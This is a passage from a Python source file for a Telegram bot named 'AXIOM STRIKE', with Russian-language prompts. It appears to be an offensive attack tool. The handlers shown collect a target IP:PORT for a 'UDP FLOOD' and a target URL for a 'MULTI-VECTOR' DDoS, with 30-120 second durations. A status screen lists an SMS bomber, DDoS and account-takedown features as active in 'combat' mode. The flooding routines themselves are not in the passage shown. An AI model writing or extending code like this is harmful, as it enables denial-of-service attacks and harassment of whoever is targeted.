        await state.set_state(DDoSStates.waiting_for_ip)
        await message.answer(
            "📡 **UDP FLOOD**\n\n"
            "Введите IP:PORT цели:\n"
            "📝 Пример: 192.168.1.1:80"
        )

    async def process_ddos_ip(self, message: types.Message, state: FSMContext):
        try:
            ip, port = message.text.strip().split(':')
            port = int(port)
        except:
            await message.answer("❌ Введите в формате IP:PORT!")
            return

        await state.update_data(ip=ip, port=port, method='udp')
        await state.set_state(DDoSStates.waiting_for_ddos_duration)
        await message.answer("⏱ Введите длительность (30-120 сек):")

    async def handle_multi_vector(self, message: types.Message, state: FSMContext):
        await state.set_state(DDoSStates.waiting_for_url)
        await state.update_data(method='multi')
        await message.answer(
            "💀 **MULTI-VECTOR**\n\n"
            "Введите URL цели:\n"
            "📝 Пример: https://example.com"
        )

    # ========== СТАТИСТИКА И НАСТРОЙКИ ==========
    async def handle_stats(self, message: types.Message):
        await message.answer(
            "📊 **СТАТИСТИКА AXIOM STRIKE**\n\n"
            f"📅 Дата: {datetime.now().strftime('%d.%m.%Y %H:%M')}\n"
            f"📱 Бомбер: активен\n"
            f"💣 DDoS: активен\n"
            f"💀 Снос: активен\n"
            f"⚡ Статус: ONLINE\n"
            f"🔥 Версия: 4.0.0",
            reply_markup=self.main_keyboard()
        )

    async def handle_settings(self, message: types.Message):
        await message.answer(
            "⚙️ **НАСТРОЙКИ**\n\n"
            "🔹 Язык: Русский\n"
            "🔹 Режим: Боевой\n"
            "🔹 Уведомления: Включены\n"
            "🔹 Логирование: Включено\n\n"
            "📌 Для изменения настроек обратитесь к администратору.",
            reply_markup=self.main_keyboard()
        )

    # ========== ЗАПУСК БОТА ==========
    async def start(self):
        logger.info("🔥 Запуск AXIOM STRIKE BOT...")
        try:
            await self.bot.get_me()
            logger.info("✅ Подключение успешно!")
            await self.dp.start_polling(self.bot)
        except Exception as e:
            logger.error(f"❌ Ошибка: {e}")
            raise


# ===================== ЗАПУСК =====================
if __name__ == "__main__":
    import re
    if API_TOKEN == "ВСТАВИТЬ_ТОКЕН_СЮДА":
        print("❌ Ошибка: Не установлен токен бота!")
        exit(1)

    try:
        bot = AxiomStrikeBot(token=API_TOKEN)
        asyncio.run(bot.start())
    except KeyboardInterrupt:
        print("\n⏹️ Бот остановлен")
    except Exception as e:
        print(f"❌ Ошибка: {e}")
        logger.error(f"Критическая ошибка: {e}", exc_info=True)
